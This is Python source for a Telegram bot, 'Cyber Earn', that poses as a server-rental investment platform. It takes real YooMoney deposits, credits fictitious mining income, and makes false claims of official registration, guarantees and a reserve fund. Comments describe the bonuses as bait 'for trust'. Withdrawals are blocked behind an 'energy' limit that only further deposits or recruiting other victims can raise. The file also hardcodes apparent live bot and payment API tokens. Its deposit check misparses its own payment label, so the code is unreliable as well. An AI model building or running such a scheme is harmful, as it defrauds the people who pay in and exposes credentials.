import asyncio
import logging
import sqlite3
import time
import random
from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message, CallbackQuery, 
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton
)
from aiogram.filters import Command, CommandStart
from yoomoney import Client

# ================= НАСТРОЙКИ =================
BOT_TOKEN = "8727966393:AAENOC9N7CofxMct5WWuZDtpqyrl__Bwea4"
ADMIN_ID = 5494544187  # Твой ID
SUPPORT_USERNAME = "@vladofix28" # Твой контакт для поддержки и выплат
PAYOUTS_CHANNEL = "https://t.me/твой_канал_с_выплатами" # Ссылка на канал с чеками

YOOMONEY_WALLET = "4100118935779591"  
YOOMONEY_TOKEN = "5133D1719448E2A5E1083A0FC605E369944CBB992B1D4490F13E2D4636C03191"  
# =============================================

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
ym_client = Client(YOOMONEY_TOKEN)

# ================= БАЗА ДАННЫХ =================
conn = sqlite3.connect('cyber_invest.db') 
cursor = conn.cursor()

cursor.execute('''CREATE TABLE IF NOT EXISTS users
                  (user_id INTEGER PRIMARY KEY, 
                   username TEXT, 
                   crypto INTEGER DEFAULT 0,        
                   rub_balance REAL DEFAULT 500,    -- Welcome бонус для доверия
                   energy REAL DEFAULT 0,           -- Лимит вывода (Защита)
                   servers INTEGER DEFAULT 1,       
                   referrer_id INTEGER DEFAULT 0,   
                   last_login INTEGER,
                   last_bonus INTEGER DEFAULT 0)''')
conn.commit()

# ================= ЭКОНОМИКА =================
MIN_WITHDRAW = 1000 
SERVER_PRICE_RUB = 150 
CRYPTO_RATE = 10000 
INCOME_PER_SERVER = 250 
CASE_PRICE_RUB = 50 

# ================= КЛАВИАТУРЫ =================
def get_main_keyboard():
    return ReplyKeyboardMarkup(keyboard=[
        [KeyboardButton(text="💻 Личный Кабинет"), KeyboardButton(text="🚀 Аренда Оборудования")],
        [KeyboardButton(text="💳 Пополнить Баланс"), KeyboardButton(text="💸 Вывод Средств")],
        [KeyboardButton(text="🔄 Биржа (Обмен)"), KeyboardButton(text="🎁 Ежедневный Дивиденд")],
        [KeyboardButton(text="📦 Крипто-Бокс"), KeyboardButton(text="👥 Партнерам (Важно)")],
        [KeyboardButton(text="🏢 О Компании / Гарантии"), KeyboardButton(text="🎧 Поддержка")]
    ], resize_keyboard=True)

# ================= ФУНКЦИИ =================
def collect_income(user_id):
    cursor.execute("SELECT last_login, servers FROM users WHERE user_id=?", (user_id,))
    row = cursor.fetchone()
    if not row: return 0
    last_login, servers = row
    current_time = int(time.time())
    hours_passed = min((current_time - last_login) / 3600.0, 24) 
    income = int(hours_passed * (servers * INCOME_PER_SERVER)) 
    
    if income > 0:
        cursor.execute("UPDATE users SET crypto = crypto + ?, last_login = ? WHERE user_id=?", (income, current_time, user_id))
        conn.commit()
    return income

# ================= ХЭНДЛЕРЫ ДОВЕРИЯ (НОВОЕ) =================

@dp.message(F.text == "🏢 О Компании / Гарантии")
async def about_company(message: Message):
    text = (
        "🏢 <b>О платформе Cyber Earn</b>\n\n"
        "Мы — официально зарегистрированная P2E платформа. Наш бот объединяет инвесторов для совместной аренды вычислительных мощностей.\n\n"
        "💡 <b>Откуда берутся деньги?</b>\n"
        "Ваши купленные сервера используются для облачного гейминга, рендеринга видео и обработки нейросетей (AI). "
        "Заказчики платят нам реальные деньги, а мы переводим их вам пропорционально вашей мощности.\n\n"
        "🛡 <b>Наши Гарантии:</b>\n"
        "1. <b>Мгновенные выплаты:</b> Регламент обработки заявок до 24 часов.\n"
        "2. <b>Резервный фонд:</b> 30% дохода компании отправляется в страховой пул.\n"
        "3. <b>Прозрачность:</b> Все выплаты публикуются в нашем официальном канале.\n\n"
        f"👉 <a href='{PAYOUTS_CHANNEL}'><b>ПОСМОТРЕТЬ КАНАЛ С ВЫПЛАТАМИ</b></a>"
    )
    await message.answer(text, parse_mode="HTML", disable_web_page_preview=True)

@dp.message(F.text == "🎧 Поддержка")
async def support_menu(message: Message):
    text = (
        "🎧 <b>Служба Поддержки Cyber Earn</b>\n\n"
        "Если у вас возникли сложности с пополнением, выводом средств или работой серверов, наш менеджер готов помочь.\n\n"
        f"👨‍💻 <b>Контакт для связи:</b> {SUPPORT_USERNAME}\n"
        "⏱ <i>Время работы: 10:00 - 22:00 (МСК). Среднее время ответа — 15 минут.</i>"
    )
    await message.answer(text, parse_mode="HTML")

# ================= ОСНОВНЫЕ ХЭНДЛЕРЫ =================

@dp.message(CommandStart())
async def cmd_start(message: Message):
    user_id = message.from_user.id
    username = message.from_user.username or f"User_{user_id}"
    ref_id = 0
    args = message.text.split()
    if len(args) > 1 and args[1].isdigit():
        ref_id = int(args[1])
        if ref_id == user_id: ref_id = 0 

    cursor.execute("SELECT user_id FROM users WHERE user_id=?", (user_id,))
    if not cursor.fetchone():
        cursor.execute("INSERT INTO users (user_id, username, last_login, referrer_id) VALUES (?, ?, ?, ?)", (user_id, username, int(time.time()), ref_id))
        conn.commit()
        if ref_id > 0:
            try: await bot.send_message(ref_id, "🤝 <b>Новый инвестор в вашей команде!</b> Вы будете получать 10% от его депозитов.", parse_mode="HTML")
            except: pass
            
        await message.answer(
            "🎁 <b>Приветственный Грант!</b>\n\n"
            "Компания выделила вам средства для старта:\n"
            "✅ <b>1 Облачный Сервер</b>\n"
            "✅ <b>500.00 ₽</b> на счет!\n\n"
            "<i>Развивайте мощности и выходите на стабильный пассивный доход.</i>", parse_mode="HTML"
        )
        await asyncio.sleep(1)

    await message.answer("🌐 <b>Личный кабинет Cyber Earn готов к работе.</b>", parse_mode="HTML", reply_markup=get_main_keyboard())

@dp.message(F.text == "💻 Личный Кабинет")
async def show_profile(message: Message):
    user_id = message.from_user.id
    income = collect_income(user_id)
    cursor.execute("SELECT crypto, rub_balance, energy, servers FROM users WHERE user_id=?", (user_id,))
    crypto, rub, energy, servers = cursor.fetchone()
    rub_per_day = (servers * INCOME_PER_SERVER * 24) / CRYPTO_RATE

    text = (
        f"📊 <b>Ваша статистика:</b>\n"
        f"➖➖➖➖➖➖➖➖➖➖\n"
        f"💳 Баланс: <b>{rub:.2f} ₽</b> <i>(Мин. вывод: {MIN_WITHDRAW} ₽)</i>\n"
        f"💠 Крипта: <b>{crypto:,}</b>\n"
        f"⚡️ Лимит вывода (Энергия): <b>{energy:.2f} ⚡️</b>\n\n"
        f"🖥 Арендовано серверов: <b>{servers} шт.</b>\n"
        f"📈 Пассивный доход: <b>~{rub_per_day:.2f} ₽ / день</b>\n"
        f"➖➖➖➖➖➖➖➖➖➖\n"
    )
    if income > 0: text += f"\n<i>✅ Добыто в фоне: +{income:,} 💠</i>"
    await message.answer(text, parse_mode="HTML")

@dp.message(F.text == "🎁 Ежедневный Дивиденд")
async def daily_bonus(message: Message):
    user_id = message.from_user.id
    current_time = int(time.time())
    cursor.execute("SELECT last_bonus FROM users WHERE user_id=?", (user_id,))
    if current_time - cursor.fetchone()[0] < 86400: return await message.answer("⏳ Дивиденды уже выплачены. Возвращайтесь завтра.")
    bonus_rub = random.randint(10, 40)
    cursor.execute("UPDATE users SET rub_balance = rub_balance + ?, last_bonus = ? WHERE user_id=?", (bonus_rub, current_time, user_id))
    conn.commit()
    await message.answer(f"🎁 <b>Начислено {bonus_rub} ₽ из резервного фонда компании!</b>", parse_mode="HTML")

@dp.message(F.text == "📦 Крипто-Бокс")
async def case_menu(message: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"Открыть за {CASE_PRICE_RUB} ₽", callback_data="open_case")]])
    await message.answer("📦 <b>Инвестиционный Бокс</b>\nПриз может окупить вложения в десятки раз!\n\nШанс выиграть +10 Лимита Вывода (Энергии)!\n" f"<i>Цена: {CASE_PRICE_RUB} ₽</i>", parse_mode="HTML", reply_markup=kb)

@dp.callback_query(F.data == "open_case")
async def open_case(callback: CallbackQuery):
    user_id = callback.from_user.id
    cursor.execute("SELECT rub_balance FROM users WHERE user_id=?", (user_id,))
    if cursor.fetchone()[0] < CASE_PRICE_RUB: return await callback.answer("❌ Не хватает рублей!", show_alert=True)
    cursor.execute("UPDATE users SET rub_balance = rub_balance - ? WHERE user_id=?", (CASE_PRICE_RUB, user_id))
    roll = random.randint(1, 100)
    if roll <= 75:
        crypto_prize = random.randint(20000, 50000)
        cursor.execute("UPDATE users SET crypto = crypto + ? WHERE user_id=?", (crypto_prize, user_id))
        msg = f"💎 Выпало: <b>{crypto_prize:,} 💠 Крипты!</b>"
    elif roll <= 95:
        cursor.execute("UPDATE users SET servers = servers + 1 WHERE user_id=?", (user_id,))
        msg = f"🖥 Выигран <b>+1 Сервер!</b>"
    else:
        cursor.execute("UPDATE users SET energy = energy + 10 WHERE user_id=?", (user_id,))
        msg = f"⚡️ <b>ДЖЕКПОТ! +10 Энергии Сети!</b>"
    conn.commit()
    await callback.message.edit_text(f"📦 Распаковка...\n\n{msg}", parse_mode="HTML")

@dp.message(F.text == "🚀 Аренда Оборудования")
async def shop_menu(message: Message):
    user_id = message.from_user.id
    collect_income(user_id)
    cursor.execute("SELECT rub_balance, servers FROM users WHERE user_id=?", (user_id,))
    rub, servers = cursor.fetchone()
    cost = servers * SERVER_PRICE_RUB
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"Арендовать за {cost} ₽", callback_data="buy_server")]])
    await message.answer(f"🚀 <b>Каталог Серверов</b>\nЦена следующего оборудования: <b>{cost} ₽</b>", parse_mode="HTML", reply_markup=kb)

@dp.callback_query(F.data == "buy_server")
async def process_buy_server(callback: CallbackQuery):
    user_id = callback.from_user.id
    cursor.execute("SELECT rub_balance, servers FROM users WHERE user_id=?", (user_id,))
    rub, servers = cursor.fetchone()
    cost = servers * SERVER_PRICE_RUB
    if rub < cost: return await callback.answer("❌ Пополните баланс!", show_alert=True)
    cursor.execute("UPDATE users SET rub_balance = rub_balance - ?, servers = servers + 1 WHERE user_id=?", (cost, user_id))
    conn.commit()
    await callback.message.edit_text("✅ <b>Сервер запущен в работу!</b>", parse_mode="HTML")

@dp.message(F.text == "🔄 Биржа (Обмен)")
async def exchange_menu(message: Message):
    user_id = message.from_user.id
    collect_income(user_id)
    cursor.execute("SELECT crypto FROM users WHERE user_id=?", (user_id,))
    crypto = cursor.fetchone()[0]
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Обменять всё", callback_data="exchange_all")]])
    await message.answer(f"🔄 <b>Биржа Крипты</b>\nКурс: {CRYPTO_RATE} 💠 = 1 ₽\nУ вас: <b>{crypto:,} 💠</b>\nК получению: <b>{(crypto / CRYPTO_RATE):.2f} ₽</b>", parse_mode="HTML", reply_markup=kb)

@dp.callback_query(F.data == "exchange_all")
async def process_exchange(callback: CallbackQuery):
    user_id = callback.from_user.id
    cursor.execute("SELECT crypto FROM users WHERE user_id=?", (user_id,))
    crypto = cursor.fetchone()[0]
    if crypto < CRYPTO_RATE: return await callback.answer("❌ Минимальная сумма обмена не достигнута.", show_alert=True)
    rub_to_add = crypto / CRYPTO_RATE
    cursor.execute("UPDATE users SET rub_balance = rub_balance + ?, crypto = 0 WHERE user_id=?", (rub_to_add, user_id))
    conn.commit()
    await callback.message.edit_text(f"✅ Средства зачислены на основной баланс: <b>+{rub_to_add:.2f} ₽</b>.", parse_mode="HTML")

# --- ПОПОЛНЕНИЕ (ПЛАТЕЖНЫЙ ШЛЮЗ) ---
@dp.message(F.text == "💳 Пополнить Баланс")
async def deposit_menu(message: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="500 ₽ (+30% Лимита)", callback_data="dep_500")],
        [InlineKeyboardButton(text="1000 ₽ (+35% Лимита)", callback_data="dep_1000")],
        [InlineKeyboardButton(text="5000 ₽ (VIP Инвестор)", callback_data="dep_5000")]
    ])
    await message.answer("💳 <b>Защищенное пополнение</b>\nВы получаете баланс + Лимит на Вывод (Энергию).", parse_mode="HTML", reply_markup=kb)

@dp.callback_query(F.data.startswith("dep_"))
async def create_deposit(callback: CallbackQuery):
    amount = int(callback.data.replace("dep_", ""))
    label = f"dep_{amount}_{callback.from_user.id}_{int(time.time())}"
    pay_url = f"https://yoomoney.ru/quickpay/confirm.xml?receiver={YOOMONEY_WALLET}&quickpay-form=shop&targets=Оплата услуг&paymentType=AC&sum={amount}&label={label}"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"💳 Оплатить {amount} ₽", url=pay_url)],
        [InlineKeyboardButton(text="🔄 Проверить оплату", callback_data=f"chkdep_{label}")]
    ])
    await callback.message.edit_text("Оплата обрабатывается официальным провайдером ЮMoney (Банковская карта / Кошелек).", reply_markup=kb)

@dp.callback_query(F.data.startswith("chkdep_"))
async def check_deposit(callback: CallbackQuery):
    label = callback.data.replace("chkdep_", "")
    amount = int(label.split("_")[0])
    user_id = int(label.split("_")[1])
    try:
        history = ym_client.operation_history(label=label)
        for op in history.operations:
            if op.status == 'success':
                energy_gain = amount * (0.30 if amount < 1000 else (0.35 if amount < 5000 else 0.40))
                cursor.execute("UPDATE users SET rub_balance = rub_balance + ?, energy = energy + ? WHERE user_id=?", (amount, energy_gain, user_id))
                cursor.execute("SELECT referrer_id FROM users WHERE user_id=?", (user_id,))
                ref_id = cursor.fetchone()[0]
                if ref_id > 0:
                    ref_bonus = amount * 0.10
                    cursor.execute("UPDATE users SET rub_balance = rub_balance + ?, energy = energy + ? WHERE user_id=?", (ref_bonus, ref_bonus, ref_id))
                    try: await bot.send_message(ref_id, f"🎉 <b>Партнерское вознаграждение!</b> Зачислено <b>{ref_bonus} ₽</b>.", parse_mode="HTML")
                    except: pass
                conn.commit()
                return await callback.message.edit_text(f"✅ <b>Платеж успешно зачислен!</b>\nПоступило: {amount} ₽", parse_mode="HTML")
        await callback.answer("❌ Платеж не найден.", show_alert=True)
    except: await callback.answer("⚠️ Ошибка шлюза.", show_alert=True)

# --- ПАРТНЕРКА И ВЫВОД (ОБЪЯСНЕНИЕ АНТИ-ФРОДА) ---
@dp.message(F.text == "👥 Партнерам (Важно)")
async def ref_menu(message: Message):
    bot_info = await bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start={message.from_user.id}"
    text = (
        f"👥 <b>Программа лояльности</b>\n\n"
        f"Для защиты от отмывания денег (Anti-Fraud), вывод средств регулируется параметром <b>Энергия Сети</b>.\n\n"
        f"<b>Как повысить лимит вывода:</b>\n"
        f"Приглашайте инвесторов. Вы будете получать <b>10% от их депозитов</b> на основной баланс и +10% к лимиту вывода!\n\n"
        f"🔗 <b>Ваша реферальная ссылка:</b>\n<code>{ref_link}</code>"
    )
    await message.answer(text, parse_mode="HTML")

@dp.message(F.text == "💸 Вывод Средств")
async def withdraw_request(message: Message):
    user_id = message.from_user.id
    cursor.execute("SELECT rub_balance, energy FROM users WHERE user_id=?", (user_id,))
    rub, energy = cursor.fetchone()
    
    if rub < MIN_WITHDRAW: return await message.answer(f"❌ Минимальная сумма вывода: <b>{MIN_WITHDRAW} ₽</b>", parse_mode="HTML")
    if energy < MIN_WITHDRAW:
        return await message.answer(f"🛡 <b>Сработала защита Anti-Fraud</b>\n\nУ вас недостаточно Энергии (Лимита) для выплаты.\nДоступно: <b>{energy:.2f} ₽</b> (Нужно: {MIN_WITHDRAW} ₽)\n\n<i>Решение: Пригласите активных партнеров или совершите депозит для подтверждения статуса инвестора.</i>", parse_mode="HTML")
        
    req_code = f"WD-{user_id}-{int(time.time())}"
    cursor.execute("UPDATE users SET rub_balance = rub_balance - ?, energy = energy - ? WHERE user_id=?", (MIN_WITHDRAW, MIN_WITHDRAW, user_id))
    conn.commit()
    
    await message.answer(f"✅ <b>Заявка на выплату {MIN_WITHDRAW} ₽ принята!</b>\n\nКод перевода: <code>{req_code}</code>\n\nНапишите в финансовый отдел: {SUPPORT_USERNAME} и прикрепите код для ручного перевода на карту.", parse_mode="HTML")
    await bot.send_message(ADMIN_ID, f"💰 <b>НОВАЯ ВЫПЛАТА!</b>\nЮзер: @{message.from_user.username}\nСумма: {MIN_WITHDRAW} ₽\nКод: {req_code}")

async def main():
    print("🚀 Cyber Earn (INVEST EDITION) ЗАПУЩЕН!")
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
